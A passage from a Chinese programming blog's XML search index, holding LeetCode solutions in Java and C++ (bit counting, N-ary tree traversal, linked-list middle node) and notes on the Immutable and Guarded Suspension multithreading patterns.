        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>338. 比特位计数</title>
    <url>/2018/09/03/LeetCode/leetcode-000338.%20%E6%AF%94%E7%89%B9%E4%BD%8D%E8%AE%A1%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非负整数 num。对于 0 ≤ i ≤ num 范围中的每个数字 i ，计算其二进制数中的 1 的数目并将它们作为数组返回。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 2</span><br><span class="line">输出: [0,1,1]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出: [0,1,1,2,1,2]</span><br></pre></td></tr></table></figure>
<p><strong>进阶：</strong></p>
<ul>
<li>给出时间复杂度为O(n*sizeof(integer))的解答非常容易。但你可以在线性时间O(n)内用一趟扫描做到吗？</li>
<li>要求算法的空间复杂度为O(n)。</li>
<li>你能进一步完善解法吗？要求在C++或任何其他语言中不使用任何内置函数（如 C++ 中的 __builtin_popcount）来执行此操作。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h4><p>使用Java自带的库函数</p>
<h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h4><p>位运算</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h4 id="解答1"><a href="#解答1" class="headerlink" title="解答1"></a>解答1</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] countBits(<span class="keyword">int</span> num) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[num + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= num;i++) &#123;</span><br><span class="line">        result[i] = Integer.bitCount(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答2"><a href="#解答2" class="headerlink" title="解答2"></a>解答2</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] countBits(<span class="keyword">int</span> num) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[num + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= num;i++) &#123;</span><br><span class="line">        result[i] = countBit(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">countBit</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (num != <span class="number">0</span>) &#123;</span><br><span class="line">        num = num &amp; (num - <span class="number">1</span>);</span><br><span class="line">        sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>559. N叉树的最大深度</title>
    <url>/2018/09/03/LeetCode/leetcode-000559.%20N%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个N叉树，找到其最大深度<br>最大深度是指从根节点到最远叶子节点的最长路径上的节点总数。</p>
<p>例如，给定一个 <code>3叉树</code> :</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000559-NaryTreeExample.png" alt="3叉树"></p>
<p>我们应返回其最大深度，3。<br><strong>说明:</strong></p>
<ul>
<li>树的深度不会超过 1000。</li>
<li>树的节点总不会超过 5000。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>递归，求每棵子树的最大深度</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> detph = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Node child : root.children) &#123;</span><br><span class="line">        detph = Math.max(detph, maxDepth(child));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> detph + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>590. N叉树的后序遍历</title>
    <url>/2018/09/03/LeetCode/leetcode-000590.%20N%E5%8F%89%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个N叉树，返回其节点值的后序遍历。<br>例如，给定一个 <code>3叉树</code> :</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000559-NaryTreeExample.png" alt="3叉树"></p>
<p>返回其后序遍历: <code>[5,6,3,2,4,1]</code>.<br><strong>说明</strong>: 递归法很简单，你可以使用迭代法完成此题吗?</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用递归</p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>使用栈。在上图例子中，如果使用栈的话，就会得到[1, 4, 2, 3, 6, 5]，明显和结果不符，但是仔细观察就会发现，它其实就是结果的逆序。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p><strong>解法一：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorder</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Node child : root.children) &#123;</span><br><span class="line">            postorder(child);</span><br><span class="line">        &#125;</span><br><span class="line">        result.add(root.val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>解法二：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorder</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    Stack&lt;Node&gt; s = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    s.push(root);</span><br><span class="line">    <span class="keyword">while</span> (!s.empty()) &#123;</span><br><span class="line">        Node node = s.pop();</span><br><span class="line">        result.add(node.val);</span><br><span class="line">        <span class="keyword">for</span> (Node temp : node.children) &#123;</span><br><span class="line">            s.push(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Collections.reverse(result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>762. 二进制表示中质数个计算置位</title>
    <url>/2018/09/03/LeetCode/leetcode-000762.%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E4%B8%AD%E8%B4%A8%E6%95%B0%E4%B8%AA%E8%AE%A1%E7%AE%97%E7%BD%AE%E4%BD%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个整数 <code>L</code> 和 <code>R</code> ，找到闭区间 <code>[L, R]</code> 范围内，计算置位位数为质数的整数个数。</p>
<p>（注意，计算置位代表二进制表示中1的个数。例如 <code>21</code> 的二进制表示 <code>10101</code> 有 3 个计算置位。还有，1 不是质数。）<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: L &#x3D; 6, R &#x3D; 10</span><br><span class="line">输出: 4</span><br><span class="line">解释:</span><br><span class="line">6 -&gt; 110 (2 个计算置位，2 是质数)</span><br><span class="line">7 -&gt; 111 (3 个计算置位，3 是质数)</span><br><span class="line">9 -&gt; 1001 (2 个计算置位，2 是质数)</span><br><span class="line">10-&gt; 1010 (2 个计算置位，2 是质数)</span><br></pre></td></tr></table></figure>
<p><strong>*示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: L &#x3D; 10, R &#x3D; 15</span><br><span class="line">输出: 5</span><br><span class="line">解释:</span><br><span class="line">10 -&gt; 1010 (2 个计算置位, 2 是质数)</span><br><span class="line">11 -&gt; 1011 (3 个计算置位, 3 是质数)</span><br><span class="line">12 -&gt; 1100 (2 个计算置位, 2 是质数)</span><br><span class="line">13 -&gt; 1101 (3 个计算置位, 3 是质数)</span><br><span class="line">14 -&gt; 1110 (3 个计算置位, 3 是质数)</span><br><span class="line">15 -&gt; 1111 (4 个计算置位, 4 不是质数)</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li><code>L</code>, <code>R</code> 是 <code>L &lt;= R</code> 且在 <code>[1, 10^6]</code> 中的整数。</li>
<li><code>R - L</code> 的最大值为 10000。<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3>10^6是小于2^20次方的，那就意味着问题可以转换为，在2的20次方之内，找到整数二进制数内数字1总数为质数的总数。<br>那问题就可以简化为，从L遍历到R，将整数转换为二进制，统计里面的1的个数，然后判断是否是20以内的质数，是总数加1，最后返回总数即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countPrimeSetBits</span><span class="params">(<span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">    HashSet&lt;Integer&gt; primes = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    primes.add(<span class="number">2</span>);</span><br><span class="line">    primes.add(<span class="number">3</span>);</span><br><span class="line">    primes.add(<span class="number">5</span>);</span><br><span class="line">    primes.add(<span class="number">7</span>);</span><br><span class="line">    primes.add(<span class="number">11</span>);</span><br><span class="line">    primes.add(<span class="number">13</span>);</span><br><span class="line">    primes.add(<span class="number">17</span>);</span><br><span class="line">    primes.add(<span class="number">19</span>);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = L;i &lt;= R;i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> value = Integer.bitCount(i);</span><br><span class="line">        <span class="keyword">if</span> (primes.contains(value)) &#123;</span><br><span class="line">            sum++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>876. 链表的中间结点</title>
    <url>/2018/09/03/LeetCode/leetcode-000876.%20%E9%93%BE%E8%A1%A8%E7%9A%84%E4%B8%AD%E9%97%B4%E7%BB%93%E7%82%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个带有头结点 <code>head</code> 的非空单链表，返回链表的中间结点。</p>
<p>如果有两个中间结点，则返回第二个中间结点。</p>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,3,4,5]</span><br><span class="line">输出：此列表中的结点 3 (序列化形式：[3,4,5])</span><br><span class="line">返回的结点值为 3 。 (测评系统对该结点序列化表述是 [3,4,5])。</span><br><span class="line">注意，我们返回了一个 ListNode 类型的对象 ans，这样：</span><br><span class="line">ans.val &#x3D; 3, ans.next.val &#x3D; 4, ans.next.next.val &#x3D; 5, 以及 ans.next.next.next &#x3D; NULL.</span><br></pre></td></tr></table></figure>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,3,4,5,6]</span><br><span class="line">输出：此列表中的结点 4 (序列化形式：[4,5,6])</span><br><span class="line">由于该列表有两个中间结点，值分别为 3 和 4，我们返回第二个结点。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>给定链表的结点数介于 <code>1</code> 和 <code>100</code> 之间。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助外部数组，将链表的值存入数组，返回数组的中间位置元素即可。</p>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">middleNode</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">		ArrayList&lt;ListNode&gt; values = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != head) &#123;</span><br><span class="line">			values.add(head);</span><br><span class="line">			head = head.next;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> values.get(values.size() / <span class="number">2</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">middleNode</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;ListNode*&gt; A = &#123;head&#125;;</span><br><span class="line">        <span class="keyword">while</span> (A.back()-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">            A.push_back(A.back()-&gt;next);</span><br><span class="line">        <span class="keyword">return</span> A[A.<span class="built_in">size</span>() / <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>使用快慢双指针，快指针每次前进两步，慢指针每次前进一步，快指针到尾部之后，慢指针就到了中点。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">middleNode</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    ListNode fast = head;</span><br><span class="line">    ListNode slow = head;</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">null</span> != fast &amp;&amp; <span class="keyword">null</span> != fast.next) &#123;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">middleNode</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* slow = head;</span><br><span class="line">        ListNode* fast = head;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>Immutable 模式</title>
    <url>/2018/09/03/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.Immutable%20%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Immutable-模式"><a href="#Immutable-模式" class="headerlink" title="Immutable 模式"></a>Immutable 模式</h1><p>java.lang.String类用于表示字符串。String类中并没有修改字符串内容的方法。也就是说，String类的实例所表示的字符串的内容绝对不会发生变化、</p>
<p>正因为如此，String类中的方法无需声明为synchronized。因为实例的内部状态不会发生改变，所以无论String类被多少个线程访问，也无需执行线程的互斥处理。</p>
<h2 id="实例程序"><a href="#实例程序" class="headerlink" title="实例程序"></a>实例程序</h2><h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Person</td>
<td>表示人的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
<tr>
<td>PrintPersonThread</td>
<td>显示Person实例的线程的类</td>
</tr>
</tbody></table>
<h3 id="Person类"><a href="#Person类" class="headerlink" title="Person类"></a>Person类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Persion</span> </span>&#123;    <span class="comment">// 声明为final，无法创建该类的子类</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String name;    <span class="comment">// 字段设置为private和final，表示一旦被赋了值，就不能再改变这个字段的值</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String address;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Persion</span><span class="params">(String name, String address)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.address = address;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.address;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"[ Person: name = "</span> + name + <span class="string">", address = "</span> + address  + <span class="string">" ]"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">	Persion alice = <span class="keyword">new</span> Persion(<span class="string">"Alice"</span>, <span class="string">"Alaska"</span>);</span><br><span class="line">	<span class="keyword">new</span> PrintPersionThread(alice).start();</span><br><span class="line">	<span class="keyword">new</span> PrintPersionThread(alice).start();</span><br><span class="line">    <span class="keyword">new</span> PrintPersionThread(alice).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PrintPersonThread类"><a href="#PrintPersonThread类" class="headerlink" title="PrintPersonThread类"></a>PrintPersonThread类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrintPersionThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Persion persion;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">PrintPersionThread</span><span class="params">(Persion persion)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.persion = persion;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">			System.out.println(Thread.currentThread().getName() + <span class="string">" prints "</span> + persion);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="实例程序的类图"><a href="#实例程序的类图" class="headerlink" title="实例程序的类图"></a>实例程序的类图</h3><p><img src="https://huhansi.github.io/images/immutable-class.png" alt="类图"><br>字段后面添加了{ frozen }约束，是UML的标识法，表示“实例被创建且字段被初始化之后，字段的值就不会被再修改”。这对应于java中的final字段。<br>方法名后面添加了{ concurrent }约束，这也是UML的标识法，它明确表示“多个线程同时执行也没有关系”。这对应于Java中的“无需声明为synchronized方法”</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《图解Java多线程设计模式》</p>
]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
        <tag>设计模式</tag>
        <tag>Immutable 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Guarded Suspension 模式</title>
    <url>/2018/09/03/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.Guarded%20Suspension%20%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Guarded-Suspension-模式"><a href="#Guarded-Suspension-模式" class="headerlink" title="Guarded Suspension 模式"></a>Guarded Suspension 模式</h1><p>Guarded Suspension 模式通过让线程等待来保证示例的安全性。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Request</td>
<td>表示一个请求的类</td>
</tr>
<tr>
<td>RequestQueue</td>
<td>依次存放请求的类</td>
</tr>
<tr>
<td>ClientThread</td>
<td>发送请求的类</td>
</tr>
<tr>
<td>ServerThread</td>
<td>接收请求的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
</tbody></table>
<h3 id="示例程序的时序图"><a href="#示例程序的时序图" class="headerlink" title="示例程序的时序图"></a>示例程序的时序图</h3><p><img src="https://huhansi.github.io/images/Gaurded-Suspension%E6%A8%A1%E5%BC%8F%E6%97%B6%E5%BA%8F%E5%9B%BE.png" alt="时序图"></p>
<h3 id="Request类"><a href="#Request类" class="headerlink" title="Request类"></a>Request类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Request</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Request</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"[ Request "</span> + name + <span class="string">" ]"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="RequestQueue类"><a href="#RequestQueue类" class="headerlink" title="RequestQueue类"></a>RequestQueue类</h3><p>RequestQueue类用于依次存放请求。该类中定义了getRequest和putRequest两个方法。</p>
<h4 id="getRequest方法"><a href="#getRequest方法" class="headerlink" title="getRequest方法"></a>getRequest方法</h4><p>getRequest方法会去除最先存放在RequestQueue中的一个请求，作为其返回值。如果一个请求都没有，那就一直等待，知道其他某个线程执行putRequest。</p>
<h4 id="putRequest方法"><a href="#putRequest方法" class="headerlink" title="putRequest方法"></a>putRequest方法</h4><p>putR方法用于添加一个请求。当线程想要向RequestQueue添加Request实例，可调用该方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RequestQueue</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Queue&lt;Request&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Request <span class="title">getRequest</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> == queue.peek()) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				wait();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> queue.remove();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">putRequest</span><span class="params">(Request request)</span> </span>&#123;</span><br><span class="line">		queue.offer(request);</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ClientThread类"><a href="#ClientThread类" class="headerlink" title="ClientThread类"></a>ClientThread类</h3><p>ClientThread类用于表示发送请求的线程。ClientThread持有RequestQueue的实例，并连续调用该实例的putRequest，放入请求。请求的名称依次为“No.0”、“No.1”……<br>为了错开发送请求的时间点，这里使用Random类随机生成了0-1000之间的数，来作为sleep的时间。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Random random;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> RequestQueue requestQueue;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ClientThread</span><span class="params">(RequestQueue requestQueue, String name, <span class="keyword">long</span> seed)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.requestQueue = requestQueue;</span><br><span class="line">		<span class="keyword">this</span>.random = <span class="keyword">new</span> Random(seed);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; <span class="number">10000</span>; index++) &#123;</span><br><span class="line">			Request request = <span class="keyword">new</span> Request(<span class="string">"No."</span> + index);</span><br><span class="line">			System.out.println(Thread.currentThread().getName() + <span class="string">" requests "</span> + request);</span><br><span class="line">			requestQueue.putRequest(request);</span><br><span class="line">			<span class="keyword">try</span> 